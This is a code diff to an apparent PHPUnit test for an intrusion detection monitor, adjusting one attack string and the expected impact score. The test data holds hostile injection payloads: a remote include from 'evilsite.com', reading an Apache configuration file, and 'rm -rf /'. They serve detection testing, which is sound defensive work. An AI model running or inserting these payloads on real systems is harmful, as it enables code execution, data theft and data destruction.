@@ -260,13 +260,13 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                   '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');',
                   ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))', 
                   '; include "http://evilsite.com/evilcode"', 
-                  '; rm -rf /'
+                  '; rm -rf /\0'
                   ),
             $this->storage
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(89, $result->getImpact());       
+        $this->assertEquals(98, $result->getImpact());       
     }
 
     public function testDecimalCCConverter() {
